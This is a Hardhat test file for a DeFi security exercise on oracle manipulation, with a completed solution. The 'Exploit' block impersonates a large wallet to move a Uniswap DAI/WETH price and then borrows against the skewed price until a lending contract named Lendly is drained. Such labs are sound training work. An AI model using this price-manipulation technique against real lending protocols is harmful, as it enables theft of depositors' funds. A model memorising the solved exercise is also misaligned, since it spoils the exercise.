const { ethers } = require('hardhat');
const { expect } = require('chai');
const { TASK_TEST_RUN_SHOW_FORK_RECOMMENDATIONS } = require('hardhat/builtin-tasks/task-names');

describe('Oracle Manipulation Exercise 2', function () {

    let deployer, attacker;

    // Addresses
    const PAIR_ADDRESS = "0xa478c2975ab1ea89e8196811f51a7b7ade33eb11"; // DAI/WETH
    const DAI_ADDRESS = "0x6B175474E89094C44Da98b954EedeAC495271d0F";
    const WETH_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
    // Binance Hot Wallet
    const IMPERSONATED_ACCOUNT_ADDRESS = "0xf977814e90da44bfa03b6295a0616a897441acec";
    const UNISWAP_ROUTER = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";


    // Amounts
    const WETH_LIQUIDITY = ethers.utils.parseEther('180'); // 180 ETH
    const DAI_LIQUIDITY = ethers.utils.parseEther('270000'); // 270K USD

    const BINANCE_AMOUNT_SWAP = ethers.utils.parseEther('10'); // 270K USD
    const HALF_ETH = ethers.utils.parseEther('0.5');

    before(async function () {
        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

        [deployer, attacker] = await ethers.getSigners();

        // Attacker starts with 1 ETH
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0xDE0B6B3A7640000", // 1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('1'));

        // Deploy Lendly with DAI/WETH contract
        const LendlyFactory = await ethers.getContractFactory(
            'contracts/oracle-manipulation-2/Lendly.sol:Lendly',
            deployer
        );
        this.lendly = await LendlyFactory.deploy(PAIR_ADDRESS);

        // Load Tokens contract
        this.weth = await ethers.getContractAt(
            "contracts/interfaces/IWETH9.sol:IWETH9",
            WETH_ADDRESS
        );
        this.dai = await ethers.getContractAt(
            "@openzeppelin/contracts/token/ERC20/IERC20.sol:IERC20",
            DAI_ADDRESS
        );

        // Convert ETH to WETH
        await this.weth.deposit({ value: WETH_LIQUIDITY });
        expect(await this.weth.balanceOf(deployer.address)).to.equal(WETH_LIQUIDITY);

        // Deposit WETH from Deployer to Lendly
        await this.weth.approve(this.lendly.address, WETH_LIQUIDITY);
        await this.lendly.deposit(this.weth.address, WETH_LIQUIDITY);
        // WETH despoit succeded
        expect(await this.weth.balanceOf(this.lendly.address)).to.equal(WETH_LIQUIDITY);
        expect(await this.lendly.deposited(this.weth.address, deployer.address)).to.equal(WETH_LIQUIDITY);

        // Depsit DAI on Lendly (from Binance hot wallet)
        let impersonatedSigner = await ethers.getImpersonatedSigner(IMPERSONATED_ACCOUNT_ADDRESS);
        await this.dai.connect(impersonatedSigner).approve(this.lendly.address, DAI_LIQUIDITY);
        await this.lendly.connect(impersonatedSigner).deposit(this.dai.address, DAI_LIQUIDITY);
        // DAI despoit succeded
        expect(await this.dai.balanceOf(this.lendly.address)).to.equal(DAI_LIQUIDITY);
        expect(await this.lendly.deposited(this.dai.address, impersonatedSigner.address)).to.equal(DAI_LIQUIDITY);

        // Didn't deposit WETH so can't borrow DAI
        expect(this.lendly.connect(impersonatedSigner).borrow(this.dai.address, DAI_LIQUIDITY)).to.be.reverted;

        // WETH depositor can borrow some DAI
        await this.lendly.borrow(this.dai.address, ethers.utils.parseEther('100'));

    });

    it('Exploit', async function () {
        /** CODE YOUR SOLUTION HERE */

        this.router = await ethers.getContractAt(
            "contracts/interfaces/IUniswapV2.sol:IUniswapV2Router01",
            UNISWAP_ROUTER
        );
        const HackerFactory = await ethers.getContractFactory(
            'contracts/oracle-manipulation-2/Hacker.sol:Hacker',
            attacker
        );
        this.hacker = await HackerFactory.deploy(PAIR_ADDRESS, WETH_ADDRESS, DAI_ADDRESS);


        let impersonatedSigner = await ethers.getImpersonatedSigner(IMPERSONATED_ACCOUNT_ADDRESS);



        console.log("Balance Attcker of Dai", await this.dai.balanceOf(attacker.address));
        console.log("Balance Attcker of WETH", await this.weth.balanceOf(attacker.address));
        console.log("Binance Balance of Dai Before", await this.dai.balanceOf(impersonatedSigner.address));
        console.log("Binance Balance of Weth Before", await this.weth.balanceOf(impersonatedSigner.address));







        const BIG_AMOUNT = ethers.utils.parseEther('1904665');


        // BINANCE transfer ETH to WETH
        await this.weth.connect(impersonatedSigner).deposit({ value: BIG_AMOUNT });


        //Attacker transfer ETH to WETH
        await this.weth.connect(attacker).deposit({ value: HALF_ETH });

        //ATTacker deposit
        await this.weth.connect(attacker).approve(this.lendly.address, BIG_AMOUNT);
        await this.dai.connect(attacker).approve(this.lendly.address, BIG_AMOUNT);

        await this.lendly.connect(attacker).deposit(WETH_ADDRESS, HALF_ETH);


        let balance_BINANCE_DAI = await this.dai.balanceOf(impersonatedSigner.address);


        // !Binance SELL DAI -- BUY WETH
        await this.dai
            .connect(impersonatedSigner)
            .transfer(
                this.hacker.address,
                balance_BINANCE_DAI
            );
        await this.hacker.connect(impersonatedSigner).sell(DAI_ADDRESS, balance_BINANCE_DAI);

        // !ATTCKER Borrow 
        let CUSTOM_LIQUIDITY = ethers.utils.parseEther('25000'); // 25K USD
        await this.lendly.connect(attacker).borrow(DAI_ADDRESS, CUSTOM_LIQUIDITY);


        // !BINANCE SELL WETH - BUY DAI 
        let balance_BINANCE_WETH = await this.weth.balanceOf(impersonatedSigner.address);
        await this.weth
            .connect(impersonatedSigner)
            .transfer(
                this.hacker.address,
                balance_BINANCE_WETH
            );

        await this.hacker.connect(impersonatedSigner).sell(WETH_ADDRESS, balance_BINANCE_WETH);


        // ! ATTaCKER sell dai -buy WETH
        // await this.dai.connect(attacker).transfer(this.hacker.address, attackerDaiBalance);
        // await this.hacker.connect(attacker).sell(DAI_ADDRESS, attackerDaiBalance);

        await this.lendly.connect(attacker).deposit(DAI_ADDRESS, await this.dai.balanceOf(attacker.address));
        CUSTOM_LIQUIDITY = ethers.utils.parseEther('180'); // 25K USD
        await this.lendly.connect(attacker).borrow(WETH_ADDRESS, CUSTOM_LIQUIDITY);
        CUSTOM_LIQUIDITY = ethers.utils.parseEther('24000');

        await this.lendly.connect(attacker).withdraw(DAI_ADDRESS, CUSTOM_LIQUIDITY);




        // !  BInance sell dai 
        let Dai_Back = await this.dai.balanceOf(impersonatedSigner.address);
        await this.dai
            .connect(impersonatedSigner)
            .transfer(
                this.hacker.address,
                Dai_Back
            );

        await this.hacker.connect(impersonatedSigner).sell(DAI_ADDRESS, Dai_Back);





        await this.lendly.connect(attacker).deposit(WETH_ADDRESS, ethers.utils.parseEther('5'));
        console.log("balance dai lendly", await this.dai.balanceOf(this.lendly.address));
        await this.lendly.connect(attacker).borrow(DAI_ADDRESS, ethers.utils.parseEther('245900'));




        let weth_Back = ethers.utils.parseEther('4692');
        await this.weth
            .connect(impersonatedSigner)
            .transfer(
                this.hacker.address,
                weth_Back
            );

        await this.hacker.connect(impersonatedSigner).sell(WETH_ADDRESS, weth_Back);




        console.log("Balance Attacker of Dai", await this.dai.balanceOf(attacker.address));
        console.log("Balance Attacker of WETH", await this.weth.balanceOf(attacker.address));

        console.log("Binance Balance of Dai After", await this.dai.balanceOf(impersonatedSigner.address));
        console.log("Binance Balance of Weth After", await this.weth.balanceOf(impersonatedSigner.address));

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Protocol Liquidity
        console.log("Lendly DAI balance: ", ethers.utils.formatUnits(await this.dai.balanceOf(this.lendly.address)));
        console.log("Lendly WETH balance: ", ethers.utils.formatUnits(await this.weth.balanceOf(this.lendly.address)));

        console.log("Attacker DAI balance: ", ethers.utils.formatUnits(await this.dai.balanceOf(attacker.address)));
        console.log("Attacker WETH balance: ", ethers.utils.formatUnits(await this.weth.balanceOf(attacker.address)));

        // Pool liquidity should be at least -95%
        expect(await this.dai.balanceOf(this.lendly.address)).to.be.lessThan(DAI_LIQUIDITY.mul(5).div(100));
        expect(await this.weth.balanceOf(this.lendly.address)).to.be.lessThan(WETH_LIQUIDITY.mul(5).div(100));

        // Attacker stole the liquidity - at least +88%
        expect(await this.dai.balanceOf(attacker.address)).to.be.greaterThan(DAI_LIQUIDITY.mul(88).div(100));
        expect(await this.weth.balanceOf(attacker.address)).to.be.greaterThan(WETH_LIQUIDITY.mul(88).div(100));
    });
});
